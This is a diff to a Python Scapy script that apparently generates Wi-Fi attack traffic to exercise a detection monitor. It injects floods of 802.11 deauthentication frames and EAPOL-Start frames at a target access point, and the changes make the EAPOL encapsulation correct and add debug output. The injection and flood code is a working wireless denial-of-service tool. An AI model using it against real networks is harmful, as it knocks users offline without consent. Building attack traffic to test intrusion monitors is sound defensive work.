@@ -21,7 +21,7 @@ To run with the monitor (in separate terminals):
 
 from scapy.all import (
     Dot11, Dot11Deauth, Dot11Auth, EAPOL, 
-    RadioTap, sendp, Ether, conf
+    RadioTap, sendp, Ether, conf, LLC, SNAP
 )
 import argparse
 import time
@@ -61,8 +61,9 @@ def craft_deauth_packet(src_mac, dst_mac, bssid):
     
     # Deauth reason code 7 = "Class 3 frame received from nonassociated STA"
     deauth = Dot11Deauth(reason=7)
-    
-    return radio / dot11 / deauth
+    pkt = radio / dot11 / deauth
+    pkt.show()
+    return pkt
 
 
 def craft_eapol_packet(src_mac, dst_mac, bssid):
@@ -91,6 +92,11 @@ def craft_eapol_packet(src_mac, dst_mac, bssid):
         FCfield=0x01     # To DS
     )
     
+    # LLC/SNAP headers for EAPOL encapsulation
+    # This is required for proper EAPOL packet structure in 802.11
+    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
+    snap = SNAP(OUI=0x000000, code=0x888e)  # 0x888e is the ethertype for EAPOL
+    
     # EAPOL Start packet (type=1)
     # This simulates WPS authentication attempts
     eapol = EAPOL(
@@ -98,8 +104,9 @@ def craft_eapol_packet(src_mac, dst_mac, bssid):
         type=1,  # EAPOL-Start
         len=0
     )
-    
-    return radio / dot11 / eapol
+    pkt = radio / dot11 / llc / snap / eapol
+    pkt.show()
+    return pkt
 
 
 def send_deauth_flood(interface, count=15, delay=0.1):
@@ -130,7 +137,7 @@ def send_deauth_flood(interface, count=15, delay=0.1):
             dst_mac=dst,
             bssid=TARGET_AP_MAC
         )
-        
+
         try:
             sendp(packet, iface=interface, verbose=False)
             packets_sent += 1
@@ -142,6 +149,9 @@ def send_deauth_flood(interface, count=15, delay=0.1):
     
     print(f"[+] Deauth flood complete: {packets_sent} packets sent")
     return packets_sent
+
+
+
 
 
 def send_wps_flood(interface, count=15, delay=0.1):
@@ -165,7 +175,7 @@ def send_wps_flood(interface, count=15, delay=0.1):
             dst_mac=TARGET_AP_MAC,
             bssid=TARGET_AP_MAC
         )
-        
+        packet.show(dump=True)  # For debugging
         try:
             sendp(packet, iface=interface, verbose=False)
             packets_sent += 1
@@ -261,12 +271,8 @@ Examples:
     
     args = parser.parse_args()
     
-   # Check for root privileges (required for packet injection)
-#    import os
-    # if os.geteuid() != 0:
-    #     print("[!] Warning: This script typically requires root privileges.")
-    #     print("    Try running with: sudo python trigger_attacks.py ...")
-    #     print()
+    # Check for root privileges (required for packet injection)
+
     
     try:
         if args.deauth_only:
@@ -291,4 +297,3 @@ Examples:
 
 if __name__ == "__main__":
     main()
-#x
